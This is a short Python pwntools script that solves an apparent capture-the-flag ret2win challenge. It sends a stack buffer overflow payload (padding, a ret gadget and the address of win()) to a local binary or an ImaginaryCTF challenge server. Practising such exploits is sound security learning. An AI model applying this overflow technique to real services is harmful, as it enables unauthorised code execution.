#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file 
elf = context.binary = ELF("vuln")

# Defining the GDB script that will be used when running the binary
gs = '''
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("ret2win.chal.imaginaryctf.org", 1337)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

# Overwrite the return address with the win() function's memory address
payload = b'A'*72 + p64(0x40101a) + p64(elf.sym.win)

# Send the payload  
io.sendline(payload)

# Interact with the process
io.interactive()